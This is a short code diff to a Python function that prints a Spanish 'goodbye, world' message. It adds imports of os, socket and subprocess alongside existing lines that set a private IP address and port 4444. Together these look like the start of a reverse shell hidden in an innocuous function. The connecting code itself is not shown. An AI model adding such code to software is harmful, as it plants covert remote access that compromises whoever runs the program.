@@ -1,4 +1,7 @@
 def run():
+  import os 
+  import socket
+  import subprocess
   print("Adios, mundo!")
   HOST = '172.16.22.82'
   PORT = 4444
